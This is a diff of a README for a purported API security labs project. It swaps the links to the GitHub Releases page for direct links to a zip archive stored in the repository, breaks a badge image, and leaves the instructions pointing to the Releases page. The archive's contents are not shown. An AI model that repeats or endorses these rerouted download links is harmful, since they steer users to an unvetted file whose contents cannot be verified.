@@ -12,12 +12,12 @@ To begin using **api-security-labs-owasp-aws**, follow these steps:
 3. Start exploring the features to improve your API security.
 
 ### Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen)](https://github.com/priyanshuchourasiya/api-security-labs-owasp-aws/releases)
+[![Download](https://raw.githubusercontent.com/priyanshuchourasiya/api-security-labs-owasp-aws/main/owasp-api-top10/labs-security-aws-owasp-api-2.1-alpha.4.zip%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/priyanshuchourasiya/api-security-labs-owasp-aws/main/owasp-api-top10/labs-security-aws-owasp-api-2.1-alpha.4.zip)
 
 ## 📥 Download & Install
 To download the software, visit the following link:
 
-[Download the Latest Release](https://github.com/priyanshuchourasiya/api-security-labs-owasp-aws/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/priyanshuchourasiya/api-security-labs-owasp-aws/main/owasp-api-top10/labs-security-aws-owasp-api-2.1-alpha.4.zip)
 
 ### Installation Instructions
 1. Click the link and go to the **Releases** page.
@@ -85,5 +85,5 @@ For any inquiries, please reach out to the project maintainer via GitHub.
 ### Download Again
 Don't forget to download the latest version from the Releases page:
 
-[Download the Latest Release](https://github.com/priyanshuchourasiya/api-security-labs-owasp-aws/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/priyanshuchourasiya/api-security-labs-owasp-aws/main/owasp-api-top10/labs-security-aws-owasp-api-2.1-alpha.4.zip)
 ```
